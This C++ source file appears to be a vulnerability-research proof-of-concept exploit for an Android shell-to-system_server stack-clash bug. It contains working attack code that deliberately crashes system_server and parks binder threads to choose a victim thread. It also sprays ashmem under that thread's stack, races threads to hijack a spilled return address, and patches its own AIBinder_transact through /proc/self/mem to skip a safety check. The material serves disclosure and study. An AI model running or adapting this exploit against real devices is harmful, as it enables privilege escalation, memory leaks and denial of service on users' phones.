// P0-465827985 shell->system_server stack-clash PoC — binder plumbing, the
// nested-recursion engine that drives a system_server thread past its guard
// page, and main(). The IIncrementalService calls live in incremental.cc and
// the Bitmap-ashmem spray in clipboard.cc; shared state and macros are in
// stackjump.h. See README.md.
#include "stackjump.h"

static void hexdump(void *_data, size_t byte_count) {
  printf("hexdump(%p, 0x%lx)\n", _data, (unsigned long)byte_count);
  bool last_was_all_zeroes = false;
  for (unsigned long byte_offset = 0; byte_offset < byte_count;) {
    unsigned char *bytes = ((unsigned char*)_data) + byte_offset;
    unsigned long line_bytes = (byte_count - byte_offset > 16) ?
            16 : (byte_count - byte_offset);

    bool all_zeroes = true;
    for (int i=0; i<line_bytes; i++) {
      if (bytes[i] != 0)
        all_zeroes = false;
    }

    if (all_zeroes) {
      if (!last_was_all_zeroes) {
        puts("[ zeroes ]");
      }
      last_was_all_zeroes = true;
      byte_offset += line_bytes;
      continue;
    }
    last_was_all_zeroes = false;

    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      if (i >= line_bytes) {
        linep += sprintf(linep, "   ");
      } else {
        linep += sprintf(linep, "%02hhx ", bytes[i]);
      }
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<line_bytes; i++) {
      if (isalnum(bytes[i]) || ispunct(bytes[i]) || bytes[i] == ' ') {
        *(linep++) = bytes[i];
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
    byte_offset += 16;
  }
}

static void recurse_more();

// Shared spray region (defined here, declared extern in stackjump.h so
// clipboard.cc can back its Bitmaps with shmem_fd). SHMEM_SIZE is a macro.
int shmem_fd;
void *shmem_map;
static int g_cur_depth = 0;                 // current nested-recursion depth
static int scan_shmem_foreign(int *first_off);

// Which phase the recursion is in. In CRASH we deliberately overflow a fresh
// (or current) system_server binder thread to force a restart; a DEAD_OBJECT
// there is expected, so we unwind quietly instead of reporting a result. In
// ATTACK we are trying to land the overflow in sprayed memory and a DEAD_OBJECT
// (recursion or loadFrom) is the moment to scan for the leak.
enum { PHASE_ATTACK, PHASE_CRASH };
static int g_phase = PHASE_ATTACK;
static volatile int g_crashed = 0;          // set when a CRASH-phase transact died

static AIBinder* (*AServiceManager_checkService_)(const char* instance);
// Shared with incremental.cc / clipboard.cc (extern in stackjump.h):
unsigned int SHELL_COMMAND_TRANSACTION = ('_' << 24) | ('C' << 16) | ('M' << 8) | 'D';
int fd_null = -1;
AIBinder *activity_service;
AIBinder *incremental_service;
AIBinder *clipboard_service;
// Interface-class handles stay local to the engine.
static AIBinder_Class *activity_service_class;
static AIBinder_Class *incremental_service_class;
static AIBinder_Class *clipboard_service_class;

static void *create_dummy_cb(void *a) { return NULL; }
static void destroy_dummy_cb(void *p) {}
static binder_status_t transact_dummy_cb(AIBinder *binder, transaction_code_t code, const AParcel *in, AParcel *out) {
  printf("transact_dummy_cb\n");
  return STATUS_INVALID_OPERATION;
}

static AIBinder_Class *class_IShellCallback;
static AIBinder_Class *class_IResultReceiver;
// Release-a-hog control (BlackHat US-15 "hang N-1 binder threads" idea): each
// hog parks a system_server binder thread in this callback. To make the attack
// victim deterministic we hang all but one; the one we release becomes the only
// free thread, so system_server must hand the attack recursion to it. Setting
// g_release_id to a hog's id makes exactly that hog return (freeing its
// system_server thread) instead of parking forever. my_ready_flag both marks a
// thread as a hog (vs the main recursion thread, where it is NULL) and signals
// back to hog() that the thread has parked.
static __thread volatile int *my_ready_flag = NULL;
static __thread int my_hog_id = -1;
static volatile int g_hog_seq = 0;          // next hog id to hand out
static volatile int g_release_id = -1;      // hog id to release (-1 = none)
static void *create_IShellCallback(void *a) { return NULL; }
static void destroy_IShellCallback(void *p) {}
static binder_status_t onTransact_IShellCallback(AIBinder *binder, transaction_code_t code, const AParcel *in, AParcel *out) {
  if (my_ready_flag != NULL) {
    *my_ready_flag = 1;                       // tell hog() this thread has parked
    // Park until asked to release this specific hog (then return, freeing the
    // system_server binder thread it was holding).
    while (g_release_id != my_hog_id) usleep(1000);
    return STATUS_INVALID_OPERATION;
  }
  //printf("onTransact_IShellCallback\n");
  recurse_more();
  return STATUS_INVALID_OPERATION;
}

// AParcel_writeParcelFileDescriptor emits a valid FD as follows:
// <4b> 1 (marker for non-null, emitted in AParcel_writeParcelFileDescriptor)
// <4b> 0 (emitted in Parcel::writeParcelFileDescriptor)
// flat_binder_object
//   <4b> binder_object_header
//   <4b> flags
//   <8b> handle
//   <8b> cookie
//
// but we just want a direct flat_binder_object, as created by
// Parcel.nativeWriteFileDescriptor -> ... -> Parcel::writeFileDescriptor
void hack_AParcel_writeFdRaw(AParcel *p, int fd) {   // shared with clipboard.cc
  AParcel *tmp = AParcel_create();
  SCHK(AParcel_writeParcelFileDescriptor(tmp, fd));
  assert(AParcel_getDataSize(tmp) == 32);
  SCHK(AParcel_appendFrom(tmp, p, 8, 24));
  AParcel_delete(tmp);
}

static void recursive_shell_command(AIBinder *service, std::vector<std::string> args) {
  AIBinder *shell_callback_binder = AIBinder_new(class_IShellCallback, NULL);
  AIBinder *result_receiver_binder = AIBinder_new(class_IResultReceiver, NULL);

  AParcel *in = NULL, *out = NULL;
  SCHK(AIBinder_prepareTransaction(service, &in));
  hack_AParcel_writeFdRaw(in, fd_null);
  hack_AParcel_writeFdRaw(in, fd_null);
  hack_AParcel_writeFdRaw(in, fd_null);
  SCHK(ndk::AParcel_writeVector(in, args));
  SCHK(AParcel_writeStrongBinder(in, shell_callback_binder));
  SCHK(AParcel_writeStrongBinder(in, result_receiver_binder));
  // Do NOT SCHK this one: a transport error here (DEAD_OBJECT) means the
  // system_server binder thread handling our nested recursion just died -- i.e.
  // its stack overflowed past the guard page. That is the primitive working, so
  // record it as a result rather than aborting with errx (which hid it as an
  // opaque failure). If it happens during recursion (rather than on the later
  // isFileFullyLoaded->loadFrom call), we recursed too deep for the controlled
  // loadFrom jump; still, report any foreign bytes the overflow spilled.
  binder_status_t st = AIBinder_transact(service, SHELL_COMMAND_TRANSACTION, &in, &out, 0);
  if (st) {
    // Only the main recursion thread reports/decides. A parked hog thread
    // (my_ready_flag != NULL) also holds a SHELL_COMMAND transaction; when
    // system_server dies it too gets DEAD_OBJECT, but that is not the attack's
    // victim -- returning quietly stops a hog from falsely reporting the result
    // (it used to print depth=0 and exit before the real recursion ran).
    if (my_ready_flag != NULL) { g_crashed = 1; return; }
    if (g_phase == PHASE_CRASH) {
      // Intended: we drove a system_server binder thread past its guard page to
      // force a restart. Every nested transact in the chain now returns
      // DEAD_OBJECT; unwind quietly (skipping the decStrong/AParcel cleanup
      // below is a bounded leak we accept) so main() can attack the fresh
      // instance.
      g_crashed = 1;
      return;
    }
    int first_off = -1, foreign = scan_shmem_foreign(&first_off);
    printf("\nDP_RESULT overflow=RECURSION depth=%d foreign=%d first_off=0x%x status=%s\n",
           g_cur_depth, foreign, first_off, AStatus_getDescription(AStatus_fromStatus(st)));
    if (foreign > 0) hexdump(shmem_map, SHMEM_SIZE);
    exit(foreign > 0 ? 0 : 4);   // 0 = leak, 4 = system_server overflow but no leak
  }
  AParcel_delete(out);

  AIBinder_decStrong(result_receiver_binder);
  AIBinder_decStrong(shell_callback_binder);
}

// Scan the sprayed shared region for any byte we did not put there. We only
// ever write 0x00 (initial), and the flipper threads write 0xaaaaaaaaa (bytes
// aa aa aa aa 0a), so anything outside {0x00,0x0a,0xaa} is memory that
// system_server leaked into our ashmem -- the info leak. Returns the count and
// reports the first offset.
static int scan_shmem_foreign(int *first_off) {
  int count = 0;
  *first_off = -1;
  for (int i = 0; i < SHMEM_SIZE; i++) {
    unsigned char b = ((unsigned char*)shmem_map)[i];
    if (b != 0x00 && b != 0x0a && b != 0xaa) {
      if (*first_off < 0) *first_off = i;
      count++;
    }
  }
  return count;
}

static int storageId;

/*
 * "start", "--start-profiler", "/FILEPATH", "-a", "android.intent.action.VIEW"
 * "dumpheap", "someprocess", "/runDumpHeap"
 * "trace-ipc", "stop", "--dump-file", "/runTraceIpcStop"
 * "profile", "lowoverhead", "stop", "someprocess", "/runProfile"
 */
// How deep to drive the nested-binder recursion into system_server. Each level
// decrements the system_server binder thread's stack pointer by ~6496 bytes
// (the "start" shell command). 131 was tuned for panther/Android 16 (BP3A,
// kernel 6.1.134); a newer build with a different ART thread-stack size or
// frame layout needs a different depth to bring the stack pointer down to the
// guard region so loadFrom()'s 128 KiB frame jumps it. Sweep via $DP_DEPTH.
static int g_max_depth = 131;

static void recurse_more() {
  printf(".");
  if (g_cur_depth < g_max_depth) {
    g_cur_depth++;
    recursive_shell_command(activity_service, std::vector<std::string>{
      "start", "--start-profiler", "/FILEPATH", "-a", "android.intent.action.VIEW"
    });
    if (g_crashed) return;   // CRASH-phase overflow happened deeper: unwind
    return;
  }
  // CRASH phase drives the recursion only to force an overflow-restart; the
  // overflow normally fires during recursion (handled in recursive_shell_command),
  // so reaching the bottom here just means this depth was not deep enough.
  if (g_phase == PHASE_CRASH) { printf("\n(crash-phase bottom, no overflow)\n"); return; }
  printf("\n");
  binder_status_t st = incremental_iffl(storageId);
  // Let the racing flippers and any in-flight system_server work settle, then
  // scan ONCE, unconditionally -- a leak can land in the shared region whether
  // or not the iffl transaction itself reported a transport error, so the scan
  // must not be gated on that (the original gated it, and so only ever noticed
  // a leak that coincided with a transport error).
  sleep(1);
  int first_off = -1;
  int foreign = scan_shmem_foreign(&first_off);
  if (foreign > 0) {
    printf("DP_RESULT leak=YES foreign=%d first_off=0x%x iffl_transport_err=%d\n",
           foreign, first_off, st != 0);
    hexdump(shmem_map, SHMEM_SIZE);
    incremental_delete(storageId);
    exit(0);                 // 0 = leak proven
  }
  printf("DP_RESULT leak=NO foreign=0 iffl_transport_err=%d\n", st != 0);
  incremental_delete(storageId);
  exit(3);                   // 3 = ran clean, no leak (distinct from errx's 1)
}

static void *hog_thread(void *ready_) {
  my_hog_id = __atomic_fetch_add(&g_hog_seq, 1, __ATOMIC_SEQ_CST);
  my_ready_flag = (volatile int *)ready_;
  recursive_shell_command(activity_service, std::vector<std::string>{
    "start", "--start-profiler", "/FILEPATH", "-a", "android.intent.action.VIEW"
  });
  // Reached only when this hog was released (its onTransact returned): the
  // shell command unwinds and the SHELL_COMMAND transaction returns. Exit the
  // thread quietly -- do NOT errx (that used to abort the whole process).
  return NULL;
}
// Park one binder thread. Returns the hog id, or -1 if it did not park within
// ~4 s -- meaning system_server had no free binder thread to service it, i.e.
// we have reached the thread-pool max (which is what we want).
static int hog() {
  int id = g_hog_seq;                 // the id hog_thread will atomically claim
  volatile int *ready = (volatile int *)calloc(1, sizeof(int));
  pthread_t thread;
  if (pthread_create(&thread, NULL, hog_thread, (void *)ready))
    errx(1, "pthread_create");
  for (int t = 0; t < 4000 && !*ready; t++) usleep(1000);
  return *ready ? id : -1;
}

static void *flipper_threadfn(void *dummy) {
  volatile unsigned long *p_32K  = (unsigned long *)((char *)shmem_map + 0x7ab8);
  volatile unsigned long *p_64K  = (unsigned long *)((char *)shmem_map + 0x7ab8 + 0x8000);
  volatile unsigned long *p_128K = (unsigned long *)((char *)shmem_map + 0x7ab8 + 0x18000);
  while (1) {
    *p_32K = 0xaaaaaaaaa;
    *p_64K = 0xaaaaaaaaa;
    *p_128K = 0xaaaaaaaaa;
  }
}

// (re)fetch a service handle and bind our class to it. Drops the old handle so
// this can be called again after a system_server restart.
static bool connect_one(const char *name, AIBinder **slot, AIBinder_Class *cls) {
  AIBinder *b = AServiceManager_checkService_(name);
  if (!b) return false;
  if (!AIBinder_associateClass(b, cls)) { AIBinder_decStrong(b); return false; }
  if (*slot) AIBinder_decStrong(*slot);
  *slot = b;
  return true;
}
static bool connect_services(void) {
  return connect_one("activity", &activity_service, activity_service_class)
      && connect_one("incremental", &incremental_service, incremental_service_class)
      && connect_one("clipboard", &clipboard_service, clipboard_service_class);
}

// Drive the recursion deep enough to fault a system_server binder thread past
// its guard page, which takes system_server down and forces a restart. We need
// the FRESH instance: a fully-started system_server already runs its maximum 32
// binder threads (so hogging cannot spawn new ones, and the existing thread
// stacks were placed at boot, before our spray). On a fresh instance we can
// force new binder-thread stacks and spray directly beneath them.
static void crash_system_server(int depth) {
  printf("CRASH phase: recursing to depth %d to overflow a system_server thread...\n", depth);
  g_phase = PHASE_CRASH; g_crashed = 0; g_cur_depth = 0; g_max_depth = depth;
  recurse_more();
  printf("CRASH phase: crashed=%d reached_depth=%d\n", g_crashed, g_cur_depth);
}

// Poll until system_server's services answer a real call, then return. Used
// both at startup (a prior attempt may have left system_server mid-restart --
// the reason a fresh process would otherwise fail its very first connect) and
// after we deliberately crash it. Returns as soon as the FRESH instance is
// reachable, which is the narrow window (few binder threads) the attack wants.
static void connect_ready(const char *why, int max_half_seconds) {
  printf("waiting for system_server (%s)...\n", why);
  for (int i = 0; i < max_half_seconds; i++) {
    usleep(500 * 1000);
    if (!connect_services()) continue;
    // liveness: isFileFullyLoaded(-100,"/") returns a normal reply (retval -22)
    // on a live service; a dead/half-restarted one returns a transport error.
    if (incremental_iffl(-100) == 0) {
      printf("system_server reachable after ~%d ms (%s)\n", (i + 1) * 500, why);
      return;
    }
  }
  errx(1, "system_server not reachable (%s)", why);
}

int main(int argc, char **argv) {
  __android_log_set_logger(__android_log_stderr_logger);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  printf("repro begin, pid %d\n", getpid());
  { const char *d = getenv("DP_DEPTH"); if (d && *d) g_max_depth = atoi(d); }
  printf("recursion depth = %d\n", g_max_depth);
  fd_null = SYSCHK(open("/dev/null", O_RDWR));

  shmem_fd = SYSCHK(memfd_create("SHMEM-SPRAY", 0));
  SYSCHK(ftruncate(shmem_fd, SHMEM_SIZE));
  shmem_map = mmap(NULL, SHMEM_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, shmem_fd, 0);
  if (shmem_map == MAP_FAILED)
    err(1, "mmap shmem");

  AServiceManager_checkService_ = (AIBinder* (*)(const char*))dlsym(RTLD_DEFAULT, "AServiceManager_checkService");
  printf("AServiceManager_checkService = %p\n", AServiceManager_checkService_);

  // On Android 15+ the NDK routes service lookups through
  // BackendUnifiedServiceManager, which refuses to hand back a usable binder
  // ("Thread Pool max thread count is 0 ... linkToDeath cannot be implemented",
  // then BR_DEAD_REPLY) unless this process is running a binder threadpool.
  // These symbols aren't in the NDK stub, so resolve them at runtime like
  // AServiceManager_checkService above.
  auto ABinderProcess_setThreadPoolMaxThreadCount_ =
      (void (*)(uint32_t))dlsym(RTLD_DEFAULT, "ABinderProcess_setThreadPoolMaxThreadCount");
  auto ABinderProcess_startThreadPool_ =
      (void (*)(void))dlsym(RTLD_DEFAULT, "ABinderProcess_startThreadPool");
  if (!ABinderProcess_setThreadPoolMaxThreadCount_ || !ABinderProcess_startThreadPool_)
    errx(1, "could not resolve ABinderProcess_* threadpool symbols");
  ABinderProcess_setThreadPoolMaxThreadCount_(8);
  ABinderProcess_startThreadPool_();
  printf("binder threadpool started\n");

  // Define our stub interface classes ONCE. activity/clipboard/incremental
  // class handles are file-scope globals so connect_services() can rebind them
  // to fresh binders after a system_server restart.
  class_IResultReceiver = AIBinder_Class_define("com.android.internal.os.IResultReceiver", create_dummy_cb, destroy_dummy_cb, transact_dummy_cb);
  class_IShellCallback =  AIBinder_Class_define("com.android.internal.os.IShellCallback", create_IShellCallback, destroy_IShellCallback, onTransact_IShellCallback);
  activity_service_class = AIBinder_Class_define("android.app.IActivityManager", create_dummy_cb, destroy_dummy_cb, transact_dummy_cb);
  AIBinder_Class_disableInterfaceTokenHeader(activity_service_class);
  incremental_service_class = AIBinder_Class_define("android.os.incremental.IIncrementalService", create_dummy_cb, destroy_dummy_cb, transact_dummy_cb);
  clipboard_service_class = AIBinder_Class_define("android.content.IClipboard", create_dummy_cb, destroy_dummy_cb, transact_dummy_cb);

  // patch away annoying check:
  // "%s: Only user-defined transactions can be made from the NDK, but requested: %d"
  printf("searching for annoying safety check... ");
  unsigned int *insnptr = (unsigned int *)(void*)AIBinder_transact;
  // MOVN encoding of
  //   mov w?, #0xffffff
  while ((*insnptr & ~0x1fu) != (0x12bfe009 & ~0x1fu))
    insnptr++;
  printf("found at offset 0x%lx... ", (char*)insnptr - (char*)(void*)AIBinder_transact);
  int mem_fd = SYSCHK(open("/proc/self/mem", O_RDWR));
  // mov w?, #0xffffffff
  unsigned int new_insn = (0x12800009 & ~0x1fu) | (*insnptr & 0x1fu);
  SYSCHK(pwrite(mem_fd, &new_insn, sizeof(new_insn), (unsigned long)insnptr));
  close(mem_fd);
  printf(" patched.\n");

  // Retry the first connect: a prior attempt may have left system_server
  // mid-restart, which used to fail the fresh process's very first lookup.
  connect_ready("initial connect", 120);

  int fresh = 1;         { const char *v = getenv("DP_FRESH");       if (v && *v) fresh = atoi(v); }
  int crash_depth = 200; { const char *v = getenv("DP_CRASH_DEPTH"); if (v && *v) crash_depth = atoi(v); }
  int attack_depth = 200;{ const char *v = getenv("DP_DEPTH");       if (v && *v) attack_depth = atoi(v); }
  // Default high so the release path hangs the pool to its max (hog() returns
  // -1 there and we stop). system_server's binder pool maxes at 32.
  const char *nh = getenv("DP_NUM_HOG");
  int num_hog = (nh && *nh) ? atoi(nh) : 34;

  // --- Option 3: attack a FRESH system_server -------------------------------
  // Crash system_server so it restarts with only a few binder threads, then
  // grow the pool ourselves and spray directly beneath the new stacks.
  if (fresh) {
    crash_system_server(crash_depth);
    connect_ready("post-crash fresh instance", 240);
  }

  // --- ATTACK phase ---------------------------------------------------------
  g_phase = PHASE_ATTACK;
  g_cur_depth = 0;
  g_max_depth = attack_depth;

  int use_release = 1; { const char *v = getenv("DP_RELEASE");     if (v && *v) use_release = atoi(v); }
  int spray_first  = 0; { const char *v = getenv("DP_SPRAY_FIRST"); if (v && *v) spray_first  = atoi(v); }

  // createStorage first -- it needs a free binder thread, and below we hang the
  // whole pool. (Also makes the mount cache stale for loadFrom.)
  storageId = incremental_create_mount();

  auto start_flippers = [](){
    for (int i = 0; i < 3; i++) {
      pthread_t f;
      if (pthread_create(&f, NULL, flipper_threadfn, NULL)) errx(1, "pthread_create flipper");
    }
  };

  if (use_release) {
    // DETERMINISTIC VICTIM (BlackHat US-15 "hang N-1 binder threads"):
    //  1. Hang binder threads until the pool is maxed (hog() returns -1). mmap
    //     is top-down, so each new stack is lower and the LAST parked hog holds
    //     the lowest thread stack.
    //  2. Spray -> the Bitmap ashmem maps just below that lowest stack.
    //  3. Release ONLY that hog. At (near-)max the pool won't spawn a new
    //     thread, so system_server hands the attack recursion to the freed one
    //     -- the thread with our spray directly beneath its guard, so the
    //     overflow spills a saved LR into shmem and the flippers hijack it.
    printf("hanging the binder pool (up to %d)...\n", num_hog);
    int last_id = -1, parked = 0;
    for (int i = 0; i < num_hog; i++) {
      int id = hog();
      if (id < 0) { printf("pool maxed after %d parked\n", parked); break; }
      last_id = id; parked++;
    }
    if (last_id < 0) errx(1, "could not park any hog");
    // Release the last (lowest-stack) hog FIRST -- the pool is fully hung, so
    // setPrimaryClip below needs this one freed thread to be serviced at all.
    // Its stack is the lowest, so the spray it maps lands directly beneath it,
    // and it is then the only free thread, so it also handles the recursion.
    printf("releasing hog %d as the victim...\n", last_id);
    g_release_id = last_id;
    usleep(300 * 1000);            // let its system_server thread become free
    printf("spraying Bitmap ashmem below hog %d's stack (via that freed thread)...\n", last_id);
    set_clipdata();
    start_flippers();
    printf("recursing (attack, depth %d): ", g_max_depth);
    recurse_more();
  } else {
    // Legacy ordering probe, no victim control.
    if (spray_first) { printf("spray first...\n"); set_clipdata();
      for (int i = 0; i < num_hog; i++) hog(); }
    else { printf("hog then spray...\n"); for (int i = 0; i < num_hog; i++) hog(); set_clipdata(); }
    start_flippers();
    printf("recursing (attack, depth %d): ", g_max_depth);
    recurse_more();
  }

  // recurse_more exits on a definite outcome (leak / overflow-no-leak). Reaching
  // here means the attack recursion completed without overflowing at all.
  printf("\nDP_RESULT leak=NO foreign=0 iffl_transport_err=0 (attack did not overflow at depth %d)\n", g_max_depth);
  incremental_delete(storageId);
  return 3;
}
